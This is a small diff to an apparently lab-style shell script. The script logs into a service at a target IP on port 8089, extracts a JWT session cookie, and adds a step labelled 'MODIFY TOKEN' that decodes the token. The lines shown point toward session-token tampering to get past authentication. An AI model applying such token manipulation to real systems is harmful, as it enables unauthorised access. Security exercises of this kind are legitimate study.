@@ -37,7 +37,10 @@ curl -s -X POST "http://$target_ip:8089/login" -c "/work/8-cookies.txt" -H "Cont
 TOKEN=$(grep jwt-session "/work/8-cookies.txt" | awk '{print $7}')
 echo "--> Token retrieved : $TOKEN"
 
-
+# Decode / transform / encode token
+echo "2.3 - MODIFY TOKEN"
+RAW=$(echo "$TOKEN" | tr -d '\n' | base64 -d)
+echo "--> Decoded token : $RAW"
 
 
 
